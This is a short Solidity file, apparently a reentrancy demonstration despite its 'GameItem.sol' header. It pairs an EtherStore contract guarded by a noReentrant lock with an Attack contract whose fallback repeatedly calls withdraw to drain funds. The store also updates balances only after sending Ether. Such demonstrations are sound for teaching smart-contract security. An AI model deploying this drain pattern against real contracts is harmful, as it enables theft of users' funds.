// contracts/GameItem.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;
//重入攻击
contract EtherStore{
    mapping(address=>uint) public balances;
    function deposit()public payable{
        balances[msg.sender]+=msg.value;
    }
    bool internal locked;
    modifier noReentrant(){
        require(!locked,"No re-reentrant");
        locked=true;
        _;
        locked=false;
    }
    function withdraw(uint _amount)public noReentrant{
        require(balances[msg.sender]>=_amount);
        (bool success, bytes memory data)=msg.sender.call{value:_amount}("");
        require(success, string(data));
        balances[msg.sender]-=_amount;
    }
    function getBalance()public view returns(uint){
        return address(this).balance;
    }
}

contract Attack{
    EtherStore public etherStore;
    constructor(address _etherStoreAddress)public {
        etherStore=EtherStore(_etherStoreAddress);
    }
    fallback()external payable{
        if(address(etherStore).balance>=1 ether){
        etherStore.withdraw(1 ether);
        }

    }
    function attack()external payable{
        require(msg.value >= 1 ether);
        etherStore.deposit{value:1 ether}();
        etherStore.withdraw(1 ether);
    }
    function getBalance()public view returns(uint){
        return address(this).balance;
    }
}